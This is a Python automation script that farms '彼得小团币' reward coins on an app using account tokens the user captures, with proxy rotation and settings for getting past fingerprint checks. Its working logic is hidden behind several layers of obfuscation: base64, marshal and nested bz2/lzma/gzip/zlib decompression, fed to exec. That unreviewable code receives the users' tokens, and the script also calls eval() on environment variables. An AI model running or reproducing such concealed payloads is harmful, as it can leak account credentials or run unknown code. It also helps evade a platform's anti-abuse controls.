"""
time：2023.12.26
定时：一天一次就行了
new Env('彼得小团币')
抓包小程序或者app或者网页的token=Agxxxx  只要token后面的值
环境变量: 名称：bd_mttoken   值：token的值#uuid的值

如果需要一对一推送的用户，
wx打开https://wxpusher.zjiecode.com/wxuser/?type=1&id=67067#/follow
关注推送应用。在进入"WxPusher消息推送平台"公众号-我的-我的UID。获取自己的UID，需要推送的用户
环境变量的值就是 token的值#uuid的值#推送UID的值

如果没推送，大概的环境变量格式就是
AgXXXXXXXXXX#00000000XXXXXXX
有推送就是
AgXXXXXXXXXX#00000000XXXXXXX#UID_XXXXXXX


多账号默认新建变量或者用 & 分开
并发变量: bd_xtbbf  默认不设置为1

"""

import marshal, base64
import os

# 活动开关 True/False
# 果园刮刮乐，12.31结束
run_ggl = False

# 自定义变量设置，不需要的不用管。
########################################################
# wxpusher管理员运行日志汇总推送 填入管理员的 UID_xxxxxxx
wxpusher_alluid = os.environ.get("bd_wxpusher_alluid")
if wxpusher_alluid is None:
    wxpusher_alluid = ''

# 自定义变量名，
# 可以自己设置一个环境变量在外面调用，默认自定义变量名 bd_zdyblm，默认不设置是bd_mttoken来调用ck
blname = os.environ.get("bd_zdyblm")
if blname is None:
    blname = 'bd_mttoken'

# 自定义变量分隔符，默认是 & 或者 新建变量。比如需要换行分割就改成 \n。
# 可以自己设置一个环境变量在外面调用，默认自定义分割变量名 bd_zdyblm，值 &
zdyfg = os.environ.get("bd_zdyfg")
if zdyfg is None:
    zdyfg = '&'
########################################################


# 调试设置
########################################################
# 是否打印详细日志 True/False
isprint = os.environ.get("bd_isprint")
if isprint is None:
    isprint = False
else:
    isprint = eval(isprint)

# 最大游戏任务循环次数
max_gamexh = os.environ.get("bd_gamexh")
if max_gamexh is None:
    max_gamexh = 5
else:
    max_gamexh = int(max_gamexh)

# 理论现在我接口生成指纹，这个不需要动，如果没跑成功，改成100。默认最大出现50个提交完成有异常的就不跑!
max_zt3 = os.environ.get("bd_maxzt3")
if max_zt3 is None:
    max_zt3 = 500
else:
    max_zt3 = int(max_zt3)

# 玄学数字，默认4，但是如果有时候提示指纹问题，上面改了100还是无法运行，改成5
xxsz = os.environ.get("bd_xxsz")
if xxsz is None:
    xxsz = 4
else:
    xxsz = int(xxsz)

# 如果改成100，4和5都没法运行，手动看看能不能正常领取游戏中心的币
########################################################


# 代理设置 代理池和代理api只能选择一个使用
########################################################
# 是否启用代理运行 True/False
isdl = os.environ.get("bd_isdlt")
if isdl is None:
    isdl = False
else:
    isdl = eval(isdl)

# 代理api，请保证api打开直接现在一个ip地址和端口即可。环境变量bd_dlapi 值：获取的代理api
proxy_api_url = os.environ.get("bd_dlapi")
if proxy_api_url is None:
    proxy_api_url = ''
# 代理api设置每多少秒切换一次
dl_sleep = os.environ.get("bd_dlsleep")
if dl_sleep is None:
    dl_sleep = 20
else:
    dl_sleep = int(dl_sleep)

# 代理池的地址 环境变量bd_dlc 值：自己的代理池的 ip:prot
proxy_url = os.environ.get("bd_dlc")
if proxy_url is None:
    proxy_url = ''

# 定义全局变量的
proxy = {
    'http': f'http://{proxy_url}',
    'https': f'http://{proxy_url}'
}

#########################################################
exec(marshal.loads(base64.b64decode(
    '81ILAABpbXBvcnQgbWFyc2hhbCwgbHptYSwgZ3ppcCwgYnoyLCBiaW5hc2NpaSwgemxpYg0KDQoNCmV4ZWMobWFyc2hhbC5sb2FkcyhiaW5hc2NpaS51bmhleGxpZnkoemxpYi5kZWNvbXByZXNzKGd6aXAuZGVjb21wcmVzcyhsem1hLmRlY29tcHJlc3MoYnoyLmRlY29tcHJlc3MoYidCWmg5MUFZJlNZNFx4ZGRceGI4XHgxZVx4MDBceDAxVlx4N2ZceGZmXHhmZlx4ZGZceGJmXHhlYVx4ZWZceGY3XHhmZVx4ZmZceGZkXHhmZlx4ZmZceGZmXHhiYlx4YmRceGZmXHhmN1x4ZmZceGZmXHhmZlx4ZmZceGZmXHhmZlx4YmRceGZmXHhmZlx4ZmZceGVmXHhmN1x4ZmZceGZmXHhkZlx4ZmZceGMwXHgwMVx4ZGRceDhlXHhhM1x4OTQ6XHgwMFx4MDBceDAwXHhkMFx4MDBceDA2XHg4MFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBoXHJceDAwXHgwMDRceDAwXHgwMFx4MDBceDAwXHgwMFx4YzhceDAwNFx4MDBceDA2XHg4MFx4MDBceDA2XHg4MVx4YTZceDhjTVx4MTBoXHgwMFx4MDBceDAwXHgwM0BceGQwNFx4MDFceGEwXHgwMVx4YTBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceGEwXHhkMFx4MDBceDAwaVx4YTNAXHgwMFx4MDBceDAwXHI0XHgwMFxyXHgwNlx4ODFceGEwXHgwMGhceDAwXHgwZVx4OTMjXHgxM1x4ZDRceGMwT0g0Zlx4ODZceDlhXHg5YVxyXHgwZkJceDE5PVwnXHhhNlM9TFx4ODNTaFx4MTNcJ1x4OTJceDA2XHhkNFx4ZjRoXHg5Zlx4YTVceDFlQ0lceDlhXHg5OFx4OGQ2XHg4MFx4ZDBceGQxXHg5MFxyT0hceGY0XHgwMjRceGMzSVx4YjUwXHgxMVx4YTZceDFhXHg5ZVx4YTNqZlx4OTFceDhkJlx4OWJAXHg5OVx4YTBceGQ0XHhjMyZceDlhXHg4ZFx4MDBceDFhXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMyFceGEwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4YTBceDBlXHgwMCFceDhhXHg4MVx4MDFceDljXHgxMVx4MTFceGExXHhjMzBceDg4XHhlM1x4MDhceDkwXHgxZFx4OGFceGEzXHg4OVx4MWZceGUxXHhkMVx4YWVLXHhhMVx0XHQtXHhkY1x4ZDUpO1x4ZGVceDgwXHg4MFx0XHg5MVx4YTJCQ1x4ZGZceDlhXCciXHhjMnJceGY2ITokJFx4ZDdpN1x4OGNceGMySlx4YjhceGY0ZWtJXHgwYmEiRFx4Y2FceGQ5QVx4ZDBceGE1Llx4ZjBceGI4XHg4YzhiXHhhNlx4ZDZxYlx4YzBceDExZF5ceGUwXHgxNFdceGYxd3VTXHhjMmJceDBlOlx4OWRceGMwXHhmNzJceDE4Ylx4OTVZXHgxODxceDA3ZFx4MGZceGFkXCdceDE3XHgwNFx4MDFcclx4YzBceDk4Y2AveVx4YmFceDhjL1x4Y2NceGMwX1x4YzBTXVx4ODBceGJjNVx4ZjA/XHgwN1x4ZjRceGJkU1x4YTBceGQ3a1x4YWFHXHgwN1x4YzZCXHgxNn5ceGMyXHhkMFx4ZTlDXHhkNCtCXHg5M1x4ZDg3XHhlZFx4ZTFceDgzXHhjN2FceGNkU3xceDFiXHhjYmx+XHg5YXNceGE3ZVx4ZWFceDgxXHgwMFBceDFjXHhmZS5ceGU4OFx4YmZgXHhkYVx4MDJceGM2XHg4NlJceDhmXHhmNVx4ZTlcblx4MTJAXHhjM1x4MDJceGM4cVx4YTNceGRhXHhhMVlceGNlNVx4MTRDXHgwN1x4ZTFBTDxceGUxXHhhNVx4YWE/XHRceGNkXHgxYlx4N2ZceDA0Tlx4ZGY4TVx4ZDh5XHhhZlx4ODlceGVkXHhiMFx4ZTBRUlx4ZTVceDA1XHg4ZDVceDBjIFx4YTVceDFiXHgxM1x4ZjdnXHhkZEl4XHhiMndrMCBceGQ3XHhhYVx4ODVceGE3XHhmZFx4ZTd0XHhlYVx4ZjFceDhiXHgxYzhcblx4OWZjc1x4ODVceDFlY2dceGY3XHgwNVx4MWFceDEzXHhlY1x4MDBceGE0XHhiNlx4ODhceGIxXHgwN2VgRlx4MTZLXHhlM0VceGM0Qlx4MThceGFlXHhjOFx4ODRceGU2XHhlZFx4OGRceGQ1MVx4ZWVceDExKShKU1x4MTdcdDBceGE2Qlx4YzJceGE3XHgwY1x4ODVKXHhlYXlceDg4XHg4ZVx4MDBYXHhiOFJceDFkXHhiMFx4ODVceDgxXHg4OHlceGQzXHgwNFx4ZTFceDAzXHhlYVx4ZDFceGMzJkdceGNiXHhmMG9ceDEzXHhhMFx4MDciMFx4ODN4XHhlMzFceDlkXHgwY2MmXHg4Nlx4YTRceDg5XHgxM1x4YzVceDk4XHgxYyBeXHhjM1x4OWRceGE1XHgwN1x4ZDhceGE5OFx4MGZzXHhkNkpceDhhXHhkNVx4ODA3e1VceGNjKzpceDg0N1x4YjNceGY2XHhhYVx4ZjVceGRmXHhmZXRceGI5IHRceDk0XHg4Mi9lXHhiMENceGMzakBceGRlKFx4ZDA0XHhiYlx4ZDFRXHhjM1RceDFmXHRUXHhlMWpceGYyXHg4OXdceDk2O1x4OWVceGEzXHgwN1x4ZWVceDA1XHhiOVx4MTFjXHhlNDJwXHhkMU9ceGI4dFx4ZjBHRlx4ZGNceDk5XHhkOFx4ODhCXHgxNFx4MTU2XHg5YTZceDAyXHg4MXtceGY0XHg4NmxJXHgxZFx4YjJceGE0XHgxMFx4ODReXHhlY1x4ZjNceDE4XHgxM0xceGRkXHhlZjlMJFx4MTBceDE3XHg4YU1ceDhiXHg5Nlx4MDFceGNlezNrXHg4M1pceGE2WFx4Y2RceGNiXHhmZU5ceGZhalx4MTBceGU5WkZceDE4JFx4ODYrXHhjMCYrXHhjMGJceGRmXHhiY1x4ODJceDhhWFx4ZjZceGNlXHgxN1x4ZWVceDAwYFx4MDgmXHhmN1x4MDVceGYzXHhlY1x4MGIqXHhlMVNceGE2XVx4MDFceDgzfVx4YzNceDgxXHgwN1x4YjFceGNjXHhjOXhceDgzXHhmYlx4ODFceGI1XHg5ZFx4OGRceGFkUmIrXHg4M1x4ZjUwXHhmZFx4OTFceGFlMFx4YmNceDhhXHhlOVx4MDNpWFx4ZjZceDk2XHhiZlx4Y2FceGExM1lceGJlXHg5OFx4MGJceDFkXHhmM3JceGM0ZFx0XHg5YyUwMFx4ZTJAXHhkMFxyXHhhMlx4YmJceDAzRlx4ZjRceDAzXHgxYyhLXHhiMSJceDA1XHgwOD9ceDBlP3xceGUzXHhjMTdceDEzXHhiMG9ceGIxXHg5M1x4YTZceGUwXHhlZlVceGIwSVx4ZTNceGFlXHg4N1x4YzBceDBjOFdceGUyXHhkYyk9XHgwNlx4YjVceGZjXHgwM1xyK2VceGVmXHhkZlx4OGRRXHhiZSB4Y1x4Y2VJXHhmY1x4MWNceGYyXHgxN1x4ZGUxXHgxZlx4ZTJceGVlSFx4YTdcblx4MTJceDA2XHg5Ylx4YjdceDAzXHhjMCcpKSkpKSkpDQo=')))
